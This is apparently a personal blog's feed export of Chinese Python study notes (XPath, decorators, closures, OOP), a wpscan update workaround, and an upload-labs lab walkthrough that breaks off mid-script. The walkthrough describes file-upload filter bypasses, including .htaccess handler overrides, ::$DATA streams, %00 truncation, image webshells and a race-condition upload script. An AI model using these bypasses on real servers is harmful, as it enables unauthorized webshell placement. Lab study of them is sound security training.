使用`..`来实现也可以使用`parent::`来获取父节点 html=etree.HTML(text, etree.HTMLParser()) result=html.xpath('//a[@href="link2.html"]/../@class') result1=html.xpath('//a[@href="link2.html"]/parent::*/@class' # 4.根据属性匹配节点 //div[@class='box'] html=etree.HTML(text, etree.HTMLParser()) result=html.xpath('//li[@class="item-1"]') print(result) # 5.获取节点中的文本 text() html=etree.HTML(text,etree.HTMLParser()) result=html.xpath('//li[@class="item-1"]/a/text()') #获取a节点下的内容 result1=html.xpath('//li[@class="item-1"]//text()') #获取li下所有子孙节点的内容 # 6. 获取属性 @href, @class, @src result=html.xpath('//li/a/@href') #获取a的href属性 result=html.xpath('//li//@href') #获取所有li子孙节点的href属性 # 7. 属性多值匹配节点(某个属性的值有多个时，一个节点有多个属性值) contains() text1=''' &lt;div> &lt;ul> &lt;li class="aaa item-0">&lt;a href="link1.html">第一个&lt;/a>&lt;/li> &lt;li class="bbb item-1">&lt;a href="link2.html">second item&lt;/a>&lt;/li> &lt;/ul> &lt;/div> ''' html=etree.HTML(text1,etree.HTMLParser()) result1=html.xpath('//li[contains(@class,"aaa")]/a/text()') # 8.多属性匹配（根据多个属性确定一个节点， 多个节点有相同的属性值） and text1=''' &lt;div> &lt;ul> &lt;li class="aaa" name="item">&lt;a href="link1.html">第一个&lt;/a>&lt;/li> &lt;li class="aaa" name="fore">&lt;a href="link2.html">second item&lt;/a>&lt;/li> &lt;/ul> &lt;/div> ''' html=etree.HTML(text1,etree.HTMLParser()) result=html.xpath('//li[@class="aaa" and @name="fore"]/a/text()') result1=html.xpath('//li[contains(@class,"aaa") and @name="fore"]/a/text()') # 9. 按序选择 # 可能同时匹配多个节点，但我们只想要其中的某个节点，如第二个节点或者最后一个节点，这时可以利用中括号引入索引的方法获取特定次序的节点： [1], [last()], position() result=html.xpath('//li[contains(@class,"aaa")]/a/text()') #获取所有li节点下a节点的内容 result1=html.xpath('//li[1][contains(@class,"aaa")]/a/text()') #获取第一个 result2=html.xpath('//li[last()][contains(@class,"aaa")]/a/text()') #获取最后一个 result3=html.xpath('//li[position()>2 and position()&lt;4][contains(@class,"aaa")]/a/text()') #获取第三个 result4=html.xpath('//li[last()-2][contains(@class,"aaa")]/a/text()') #获取倒数第三个 # XPath的函数： http://www.w3school.com.cn/xpath/xpath_functions.asp # 10. 节点轴选择 # 包括获取子元素、兄弟元素、父元素、祖先元素等 result=html.xpath('//li[1]/ancestor::*') #获取所有祖先节点 result1=html.xpath('//li[1]/ancestor::div') #获取div祖先节点 result2=html.xpath('//li[1]/attribute::*') #获取所有属性值 result3=html.xpath('//li[1]/child::*') #获取所有直接子节点 result4=html.xpath('//li[1]/descendant::a') #获取所有子孙节点的a节点 result5=html.xpath('//li[1]/following::*') #获取当前子节之后的所有节点 result6=html.xpath('//li[1]/following-sibling::*') #获取当前节点的所有同级节点 # 更多轴的用法可参考：http://www.w3school.com.cn/xpath/xpath_axes.asp 本文参考：https://www.cnblogs.com/zhangxinqi/p/9210211.html 博主写的很详细，也很美观 XPath的更多用法参考：http://www.w3school.com.cn/xpath/index.asp python lxml库的更多用法参考：http://lxml.de/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>XPath</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python基础-装饰器]]></title>
    <url>%2Fposts%2F6b278895%2F</url>
    <content type="text"><![CDATA[装饰器###函数的装饰器,本质上就是一个闭包 ## 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2 @f1 #装饰器 (@符号加函数名,装饰上了gun函数) #相当于f1(gun) def gun(m): print('gun runing') return m*m ## @f1 -> f1( gun) -> f2 n=gun(5) # gun(5) -> 就是在运行 f2(5) print(n) #############例子: import time def run_time(func): def new_fun(*args,**kwargs): t0 = time.time() print('star time: %s'%(time.strftime('%X',time.localtime())) ) back = func(*args,**kwargs) print('end time: %s'%(time.strftime('%X',time.localtime())) ) print('run time: %s'%(time.time() - t0)) return back return new_fun @run_time def test2(n): for i in range(1,n): for j in range(1,i+1): print('%dx%d=%2s'%(j,i,i*j),end = ' ') print () #@run_time -> run_time(test2) -> new_fun n = test2(10) #就相当于运行new_time(5) 例子# 写一个login函数 然后写一个装饰器，模拟登录过程：让程序延迟3秒 在延迟过程中输出正在验证 """ def login(): print('登录成功') """ import time def login_required(func): def wrpper(*args,**kwargs): print('正在验证...') time.sleep(5) return func(*args,**kwargs) return wrpper @login_required def login(): print('登录成功') #return 'code:200' login() 类作为装饰器## 用__call__方法 class Tset_Class(): def __init__(self,func): # 传进来函数 print('正在实例化') self.func = func def __call__(self, *args, **kwargs): #类装饰器, 一定要写__call__方法 print('这是call方法') return self.func @Tset_Class def test(): print('这是一个测试函数') n = test() # self.func : test 函数体 n() # n() 调用test（） # 1. @Tset_Class ： Tset_Class( test ) -> 相当于：t = Tset_Class( test ) # 2. test() -> 相当于： 调用实例的call方法 -> 返回 self.func函数体 # 3. n = test() ，n() 调用test（） 类中常见的几种装饰器class Test(): aa = 123 def __init__(self,name): self.__name = name @property # 把方法变成属性 def get_name(self): print( self.__name) return self.__name @get_name.setter # 可以让get方法，变成set方法 def get_name(self,name): self.__name = name @property # 把方法变成属性 def po(self): print('asdfasdfasdfasdaf') @staticmethod def test(): print('staticmethod func') @classmethod def show(cls): print(cls.aa) # 可以访问类属性 print('classmethod func ') t = Test('jianeng') t.show() # @property # t.get_name = 4 # get_name.setter 没有写的时候， = 4 会报错 # t.get_name # t.po # @staticmethod #没有self t.test() # 没有self ，实例不能调用。 Test.test() # 类名可以直接调用 ### @classmethod #类方法, 一般是用来做封装 class名字已经传进去了 Test.show() #有self， 类名不能直接调用 t.show() ##静态方法装饰器： staticmethod 类调用与实例调用无差别， 也不需要self参数，类似于普通函数 不需实例化就可以调用,直接用类名调用 （与实例解绑）， 不能访问其他的类属性与方法（相当于类的方法） ##类方法装饰器： classmethod self参数被换成cls参数， 自动传入对应的类 可以访问类属性与其他类方法 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>装饰器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python基础-闭包]]></title>
    <url>%2Fposts%2F1c7bab7f%2F</url>
    <content type="text"><![CDATA[# 闭包: 一个函数里面嵌套一个函数,调用外层函数返回里层函数本身 #1. def fx(x): x+=1 def fy(y): return x*y return fy #不要加括号 f=fx(5) #拿到fy的函数体 n = f(5) #fy() print(n) #2.传进去的参数为函数体 def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2 def gun(m): print('gun runing') return m*m temp = f1(gun) # 返回f2函数体 # f1 runing -> f2 ->temp n= temp( 5) # f2( 5) -> ' f2 running ' -> return func(y) +1 # func(y) === gun(m) -> gun runing -> 5*5 # return 25 +1 -> 26 print(n) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python面向对象-继承小小例子]]></title>
    <url>%2Fposts%2Fe211efc6%2F</url>
    <content type="text"><![CDATA[用之前学习笔记的小例子来复习一下 ############################继承 #父类里面有的,子类里面再写一次. 叫做重写 ,只会用子类的了,父类的就屏蔽了 #继承是通过查找来找的, 不是变量空间的复制, 还是独立的变量空间 # 多继承 既不是广度也不是深度搜索 . mro() 方法,是在类里面的,他会自己计算出搜索顺序 例如: print(Magician.mro())或print(Magician.__mro__) 或者 print(s.__class__.mro()) # [&lt;class '__main__.Magician'>, &lt;class '__main__.Role'>, &lt;class 'object'>] # super 自己找父类, 如果父类改变,也不需要修改,哪怕父类被更换，也不用担心了！ super不需要再传self ,super是通过mro查找的 #__bases__特殊属性 print(Role.__bases__) 打印出来是一个元组 (&lt;class 'object'>,) #实例+() 自动调用__call__方法 class Role: def __init__(self,name,level,blood): # 在实例化之后自动被调用,用来进行初始化 self.name = name self.level = level self.blood = blood def __repr__(self): return "{cls}:{name},{level},{blood}".format(cls=self.__class__.__name__, name=self.name, level=self.level, blood=self.blood ) def figth(self): raise NotImplementedError('必须在子类中实现该行为') class SwordsMan(Role): #继承了Role类 def __init__(self,name,level,blood,attack_power): #重写了__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) #不在明确指定类名 self.attack_power = attack_power def fight(self): print('物理攻击') class Magician(Role): #继承自Role def __init__(self,name,level,blood,magical_power): #重写了__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) # 不在明确指定类名 self.magical_power = magical_power def fight(self): print('魔法攻击') def cure(self): print('治疗') ## 鸭子类型 #展示出攻击的效果(这件事,不属于任何一个角色) #写出一个函数 def draw_fight(role): # 鸭子类型体现出来是,一个函数,所关心的不是类型,而是行为 print('role', end='') role.fight() # 其实并不关心,role是不是一个role实例 class GirlFriend: #虽然没有继承Role类,依然可以用鸭子类型 def __init__(self,name): self.name = name def fight(self): print('拔电源攻击') g = GirlFriend('xxx') draw_fight(g) #打印出role拔电源攻击 s= SwordsMan('xps',18,3000,150) #实例化 m = Magician('ps',18,1400,6660) draw_fight(s) #打印出 role物理攻击 draw_fight(m) #打印出 role魔法攻击 print(s) print(m.__repr__()) print('***********************************************************') # 继承是通过查找来找的, 不是变量空间的复制, 而是独立的变量空间 class BaseClass: attribute = 1 def method(self): pass class DerivedClass: # 简单继承,没有任何的封装与重写 pass print(DerivedClass.__dict__) # DerivedClass中没有 attribute 与 method print(BaseClass.__dict__) # BaseClass中有 print(Magician.__mro__) print(s.__class__.mro()) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python面向对象小例子]]></title>
    <url>%2Fposts%2F4cceafcb%2F</url>
    <content type="text"><![CDATA[用一个银行存款取款的例子来回忆一下面向对象最基础的部分 class Account: all_count={} #类属性 def __init__(self, name, number, balance): # 初始化账户的'实例方法',见名知意 self.name = name self.number = number # 实例的变量属性 self.balance = balance self.all_count[self.number] = self # # def __del__(self): #当实例对象被销毁的时候,当变量的指向为0的时候 自动触发 # print(self.name,'被销毁了') def deposit(self, amount): # 存款 if amount &lt;= 0: print('存款金额不得为负') else: self.balance += amount def withdraw(self, amount): # 取款 if amount > self.balance: print('余额不足') else: self.balance -= amount def describe(self): # 查询账户详情 return "Account(姓名:{name},账户:{number},余额:{balance})".format(name=self.name, number=self.number, balance=self.balance) def close(self): self.all_count.pop(self.number) a=Account('xps','6217',10000) v = getattr(a,'nme','000') # b = a # del a print(v) # a.deposit(5000) # a.withdraw(2500) # print(a.describe()) # # print(a.__dict__) # print(__name__) ############################################ 笔记 #######################################3 #__init__() 在实例化之后自动被调用,用来进行初始化 #__del__() 删除变量的指向,不是直接去删除这个对象 例如:a=[1,2,3] b=a del a a变量没了,但是b还存在 #程序执行完之后变量的内存自动释放.自动触发 __del__ #__str__() #str 会自动触发 对用户友好 后面可以直接 print(a) 来输出str的值,如果没有定义a,则输出repr的值 #__repr__() repr会自动触发 对开发者友好 在控制台shell 直接 a 输出repr的值 ,如果repr没有定义,则不会找str #getattr() getattr(i,'name','没有') 相当于转换成对象的访问 obj.name 获取,,和字典里面的get()方法类似,找不到返回'没有' 'name'这里是一个字符串 #hasattr() hasattr(i,'xxx') 返回布尔值 (还可以避免因为属性没有而产生报错) 'xxx'也是字符串 hasattr 还可以避免，因为属性没有，而导致的报错 #setattr() setattr(i,'name','vvv'') 自动转换成i.name = 'vvv' 'name'这里是一个字符串 #delattr() delattr(i,'name') 删除 'name'这里是一个字符串 转化成del i.name #__class__ 可以得到一个类实例所属的类对象,print(a.__class__) &lt;class '__main__.Account'> 不是类名 #__doc__ 注释文档写了之后,可以help出来 如:print(help(Account)) # 注释存储在了__doc__里 如: print(Account.__doc__)可以打印其文档注释 #__dict__ 一个存储了对象属性的字典 把该变量空间的打印出来 # 例:print(a.__dict__) >>{'balance': 12500, 'name': 'xps', 'number': '6217'} #类也可以 print(Account.__dict__) #__name__ def dance(): pass print(dance.__name__) #可以查看该函数的名字 class C: pass print(C.__name__) #可以查看该类的名字 #类名 是一个字符串 #print 输出的是你给他的东西得 __str__ #shell 里面 输出的是 你给他的东西的 __repr__ #self 是实例本身 # print 输出的str 但是如果输出一个数据结构(集合元组字典列表)的数据,里面的数据,会以repr展示 ######################################################################################## if __name__ == '__main__': pass #print(str(__name__)) __name__ #import 的时候,会把那个文件执行一遍 ###如果作为一个模块被导入的话,就不会调用__name__以下的东西 # print(__name__) 结果为 __main__ #######################################################闭包###########################33 class A: def __del__(self): print('被销毁0') def outer(): # a=A() #a 是在函数调用时候实例化的 def inner(): #inner 也是在outer里面定义的,在outer结束的时候inner也被销毁 print(a) return inner x = outer() #用一个变量去接受,就不会打印出来,inner获得一个临时指向 del x #销毁函数inner #1.构造局部的全局变量 #2.在没有类的情况下,封装变量 input() ######私有化,保护作用,类的外面访问不到 _eye=2 # protect 隐藏 但是可print(dog._eye)访问.修改 __leg=4 # 彻底保护. 万一访问的话,可以以下在外面访问(先定义一个方法): def getLeg(self): #获取私有属性 return self.__leg leg = dog.getLeg() print(leg) #可通过此方法在类外面查看 ###如果是修改私有属性的话: def setLeg(self,leg): #设置 self.__leg = leg dog.setLeg(55) #修改私有属性 print(dog.getLeg()) #用get 方法来查看一下 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wpscan更新超时报错]]></title>
    <url>%2Fposts%2F5366e554%2F</url>
    <content type="text"><![CDATA[https://blog.csdn.net/zhang644720213/article/details/92849717 参考自：https://blog.csdn.net/zhang644720213/article/details/92849717 先更新一下系统的索引updatedb 查看文件dpkg -L wpscan 下载需要的包（感谢大佬提供）:wget https://files.cnblogs.com/files/despotic/wp.zip 放到本地apache的目录下：mv wp.zip /var/www/html/wpscan/ 解压：unzip wp.zip 重启apache/etc/init.d/apache2 restart 编辑配置文件：vim /var/lib/gems/2.5.0/gems/wpscan-3.5.4/lib/wpscan/db/updater.rb 找到：def remote_file_url这个函数， 下面的服务器地址改为本地的目录http://127.0.0.1/wpsaca/#{filename} 再运行wpscan --upgrade就可以了 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WPscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs通关记录]]></title>
    <url>%2Fposts%2F3890b03c%2F</url>
    <content type="text"><![CDATA[本文主要记录一下upload-labs最新21关卡的过程，作为自己的一个笔记。 靶场地址：https://github.com/c0ny1/upload-labs/ ps： - 为了快速验证效果，此处上传的webshell代码为&lt;php? phpinfo(); ?&gt; - 解题思路五花八门，我这里想起了啥就用啥。 - 因为比较菜，所以做题直接看代码了就(谁料有的题目看了代码都看不懂)，哈哈哈。 相关函数trim() 去除空格 strrchr()查找字符串在另一个字符串中`最后一次`出现的位置，并返回从该位置到字符串结尾的所有字符。 strrchr("被查找的字符串", "出现的字符串") strstr() - 查找字符串的首次出现 strrpos() - 计算指定字符串在目标字符串中最后一次出现的位置 str_ireplace('要替换的对象','替换为','字符串') deldot($file_name);//删除文件名末尾的点 ::$DATA ---&gt; win上，会把`::$DATA`之后的数据当成文件流处理，不会检测后缀名，而且保持`::$DATA`之前的文件名（目的是不检查后缀名） pathinfo(path,options)返回一个关联数组包含有 path 的信息。 包括以下的数组元素： [dirname] [basename] [extension] 第二个参数可能的值： PATHINFO_DIRNAME - 只返回 dirname PATHINFO_BASENAME - 只返回 basename PATHINFO_EXTENSION - 只返回 extension 注释：如果不是要求取得所有单元，则 pathinfo() 函数返回字符串。 intval() 函数用于获取变量的整数值。 @uppack `rename()` 函数 ：重命名文件或目录。如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。rename(oldname,newname,context) Pass-01 js验证 点击上传文件之后，burp没有拦截到数据包，并且验证反应速度快 F12查看代码后确认 绕过F1: 禁用js，直接上传php 成功： F2： 在本地创建html，action为服务器请求地址，（去掉相应js部分） F3: 先把shell改为允许的类型,再bup中再改回来 效果都是一样的 Pass-02 服务端验证 – 文件MIME类型 只检测文件自带的类型 绕过：burp修改数据包中修改MIME类型（Content-Type）为允许的类型 Pass03-Pass10: 黑名单校验Pass-03 服务端验证(黑名单方式) – 多种格式后缀解析 对上传的文件先过滤，后判断文件后缀，再随机命名 比如： a.php 先删掉文件名前后的空格 删除末尾的点： a.php strrchr之后： .php 转换为小写： .php 去除字符串::$DATA 再收尾去空格 最后加上日期重命名 绕过 前提: httpd-conf文件中AddType application/x-httpd-php 没有被注释，而且有规定类型的文件 对 phtml，php3，php4，php5，pht，htaccess没有进行过滤，那么利用这两种方法进行绕过。 补充: asp: asa, cer, cdx 等 jsp: jspx, jspf aspx: ashx,asmx,ascx 准备工作： 修改httpd-conf配置文件,这里可以把php3等想要的文件后缀加上，再把注释符#去掉 此类的正则表达式，文件名字满足即可在apache当做php解析。比如以下格式的文件： php3，php4, php5, phtml，phps 修改为： AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .phps F1: 修改后缀名 burp拦截数据包，修改filename为php3,上传成功 右键图片查看地址, 从这里可以得知上传的文件被重命名了, 打开图片地址，OK F2: 上传图片马 上传图片马，然后利用BP拦截，将后缀名 改为phtml,php3,php4,php5,pht ​ ​ Pass-04 服务端（php5之类的也进行了过滤） 但是没有过滤.htaccess，可以考虑重写文件解析规则绕过 info.php.jpg. 绕过 前提: apache搭建， 没有对上传文件重命名 .htaccess文件 1.先上传一个.htaccess文件，内容如下： &lt;FilesMatch "jpg"> SetHandler application/x-httpd-php &lt;/FilesMatch> 2.然后再上传一个info.php, burp拦截数据包修改filename为info.jpg / 或者直接上图片马， url访问图片路径，正常解析 Pass-05 连.htaccess都放黑名单了 缺陷： strrchr函数： 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符 如果有多个，匹配的是最后一个（这里并没有进行递归检测，前面的就会漏掉） 如果是a.php. jpg.是不能正常解析的，但是a.php. .就行 绕过：多写一个空格和点：上传文件 info.php， burp修改file为info.php. . 比如： a.php. . 去空：a.php. . 删除末尾点：a.php. 最后一个点被deldot删除 返回最后一个点的内容. 第二个strrchr匹配了第一个点和后面的空格 前后去空：后缀为., 不在黑名单范围，成功绕过 最后上传文件名为：a.php., 在windows保存文件的之后的.会消失 如下图，win服务器保存的文件： 正常解析： Pass-06 没有进行后缀名大小写转换 绕过burp修改filename后缀名为.phP，绕过检测，上传OK 正常解析 Pass-07 最后没有将后缀首尾去空 可以利用win文件名字保存格式的特性: 比如最后一个为空格info.php, .php不在黑名单.php等中，成功绕过， 并且windows保存的时候会把最后的空格去除 绕过burp修改filename为info.php，后面加一个空格，上传 Pass-08 少了提前删除文件名末尾的点 的功能(deldot)； strrchr过滤匹配的是最后一个点； 没有对上传的文件重命名 绕过:F1： 后缀名加点绕过 burp修改文件名， a.php. a.php.可以带空格 上传。 F2：利用Windows解析漏洞（后缀修改为1.php:1.jpg） 1.php:1.jpg 没成功： 上传的是1.php，但是文件内容是空的了 ​ ​ Pass-09 Windows文件流绕过 少了 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA –&gt; 含义：把后缀中是 ::DATA替换为空 str_ireplace('要替换的对象','替换为','字符串')函数 由上可知，文件没有对后缀名进行去”::DATA”处理。 php在window的时候如果文件名+”::DATA”处理。php在window的时候如果文件名+”::DATA”处理。php在window的时候如果文件名+”::DATA”会把::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::DATA”之前的文件名 他的目的就是不检查后缀名。 ps:只能是Windows系统，并且只能时php文件 绕过info.php::$DATA 1.如图 ，在BP中修改图片马的 jpg 的后缀名，将其改为 php ，并且在后面加上 ::$DATA ; 2.在网页上检查图片马的执行情况时，将图片马的后缀名中 ::$DATA ，删去，便可浏览。 如图，这个是没有去掉后缀时，会发生报错。（因为我们实际上传的是PHP文件，即upload文件夹中只有php文件，而不存在带有后缀 ::$DATA的文件） Pass 10 - 11 （将filename拼接路径会带来极大风险）Pass-10 绕过构造后缀名点空绕过 strrchr函数 搜索参数在字符串中的位置，并返回从该位置到字符串结尾的所有字符 如果有多个，匹配的是最后一个（前面的就会漏掉 由上可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，构造后缀名为php+点+空+点 burp修改文件名info.php. . Pass-11 双写绕过 没有strrchr str_ireplace函数： str_ireplace('要替换的对象','替换为','字符串'), 他把我们的php后缀替换为空 函数缺陷： 只是执行一次/或者没采用递归过滤 绕过扰乱，删除里面后，外面还能组合成功后缀 burp修改filename=info.pphphp info.pphphp — &gt; ‘info.php’ Pass 12 - 13 将filename当做变量加入最终路径会带来极大风险Pass - 12 GET请求，URL网页上00截断 前提条件：php5.34以下， magic_quotes_gpc为off状态 魔术引号 magic_quotes_gpc 作用： 对（反斜杠？，单引号，双引号，none）产生影响, 自动加上/ 白名单绕过 ) save_path可控， $_GET['save_path'] 通过get获取，可以把get中url参数带上00截断 %00 截断（类似注释符号，后面的不再执行） Note： %00 是URL编码后的结果， 选中，解码转换（url decode）为小方块，才是真正的%00, Hex下是00 数据包中 save_path=../upload/shell.php%00 （注意 url_decode）后面的就没用了，filename=”shell.jpg” 由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 .jpg 截断，从而以 php 运行 绕过URI中00截断 方法一：拦包00截断 由于是在get的url中，%00就不进行decode了， 上传成功： 查看图片路径： 查看服务器保存文件： 访问的时候，去掉后面的jpg，只访问php，OK： 方法二：前端直接修改为 “php+00截断”格式 如下可得，直接将参数save_path修改为php+00截断的格式，因此它会将之后上传的所有文件以PHP的格式进行解析。 ps:图片是盗取的 burp只修改下面的filename为x.jpg即可 Pass - 13 POST请求，00截断 白名单绕过 F1: 同12关，只是修改的地方不同 1.burp拦截。在post后面加上info.php%00 (%00是url decode之后的)，再发送即可 2.burp拦截，然后在上面的upload 的后面加上 123.php+（这里的123可以为任何名字，他只是一个代号。并且 php后面的 +好也是一个标记，他的二进制代码为 2b） 由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 . 同样，访问的时候访问php文件： F2 意外发现：文件覆盖 由于名字可以不相同，即我们可以任意定义uploads旁边的 PHP 文件名，如果将文件名改为uploads中本身存在的文件，那么新的文件将会覆盖原来的文件。 Pass - 20 （也是类似的，便于比较就放这里了） 这里进行过滤的是他的那个文件名，而不是我们上传文件最开始的文件名，所以要在他的文件名上做手脚 $file_ext = pathinfo($file_name,PATHINFO_EXTENSION) 返回拓展后缀 这里的文件名filename是可控的： $_POST['save_name'] 绕过 我们可以在save_path中加入php+00截断，由于是POST发送方式，因此我们需进行00截断。111.php%00upload-19.jpg （注意url decode） 上传OK： 去掉00后面内容，访问php，正常解析 Pass14 - 17 （文件包含漏洞）Pass - 14 获取文件头进行了验证 图片马制作： win下：copy a.jpg /b + b.php /a shell.jpg Linux下：cat a.jpg b.php &gt; shell.jpg 文件包含漏洞（xx.php?file=uploads/x.jpg） 文件不限格式后缀 意义：如果存在包含漏洞，需要上传一张图片(图片马)，就可以getshell $strInfo = @unpack("C2chars", $bin);// C为无符号整数，网上搜到的都是c，为有符号整数，这样会产生负数判断不正常 $bin = fread($file, 2); //只读2字节进行验证 表示只是对文件头做了检测 $strInfo = @unpack("C2chars", $bin); 标示前两个字符按照，c格式，数组索引chars1,chars2 @unpack $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); 文件头： 不同后缀类型文件头部代码中有GIF89a,NG,PK,7Z， 部分验证会验证文件头 常见文件头：https://blog.csdn.net/xiangshangbashaonian/article/details/80156865 突破： 伪造可行的文件头 绕过上传图片马，上传。打开测试页面，引用刚才的图片马 Pass - 15 getimagesize 函数拓展：getimagesize（） 判断是否为一个完整的图像 索引2$info[2] 是图像的类型 image_type_to_extension 获取的是MIME类型 $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); # 获取后缀jpeg , $info[2] 是文件类型 if(stripos($types,$ext)>=0) # 是否在白名单中 绕过上传图片马， 打开测试页面，直接包含includefile=’文件.jpg’, 就是当成php解析 Pass - 16 php_exif模块 函数拓展：exif_imagetype（） php_exif模块来判断文件类型 版本：PHP&gt;=4.3.0, PHP5, PHP7 绕过需要开启php_exif模块： 1.打开配置文件，php拓展，php_exif打开； 2.配置文件在php.ini,分号是注释，可以直接解除注释启用,并将此行移动到extension=php_exif.dll之前，使之首先加载*。 上传图片马（注意MIME与后缀和文件头要一直，然后打开测试页面，包含gif，OK Pass - 17 （图片二次编码）其实就是检测两次 本质： 检测 MIME和后缀是否对应 原理： 将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。 具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); 绕过好了，还是太菜，还是看大佬的解决方案学习学习把吧:点击这里 1.GIF 关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了. 2.PNG png的二次渲染的绕过并不能像gif那样简单. 3.JPG ps: 这一关是二次渲染的，还是多学习学习吧 18 -19 条件竞争 （多线程发包）Pass - 18 unlink函数： 数删除文件。若成功，则返回 true，失败则返回 false 执行步骤： 1.取出上传文件的后缀名 2.临时文件移动（move_uploaded_file）到一个路径下面， 3.如果后缀名在白名单，进行最后移动，保存 4.如果后缀名不在白名单，unlink删除临时文件 绕过 趁他不注意（多线程），在临时文件里面写一个创建后门文件的功能，这样虽然临时文件不满足被删除，但是自己自动创建的文件已经存在服务器目录了 F1： 其中，诱饵上传文件代码 &lt;?php $myfile = fopen("shell.php", "w") or die("Unable to open file!"); $txt = "&lt;?php phpinfo(); ?>\n"; fwrite($myfile, $txt); fclose($myfile); ?> 然后，如果已知新建文件的路径，可以直接访问 ​ 如果不知道，可以抓取数据包查看 方法： 1.利用burp的Intruder使用多线程发包(如下图)， 2.然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 webshell，新文件也会创建成功 ) F2: Python \#!/usr/bin/env python3 \# coding:utf-8 import hackhttp from multiprocessing.dummy import Pool as ThreadPool def upload(lists): ​ hh = hackhttp.hackhttp() ​ raw = """POST /upload-labs/Pass-17/index.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/upload-labs/Pass-18/index.php Cookie: pass=18 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=---------------------------6696274297634 Content-Length: 341 -----------------------------6696274297634 Content-Disposition: form-data; name="upload_file"; filename="18.php" Content-Type: application/octet-stream &lt;?php $myfile = fopen("shell.php", "w") or die("Unable to open file!"); $txt = "&lt;?php phpinfo(); ?>\n"; fwrite($myfile, $txt); fclose($myfile); ?> -----------------------------6696274297634 Content-Disposition: form-data; name="submit" 上传 -----------------------------6696274297634-- """ ​ code, head, html, redirect, log = hh.http('http://127.0.0.1/upload-labs/Pass-17/index.php', raw=raw) ​ print(str(code) + 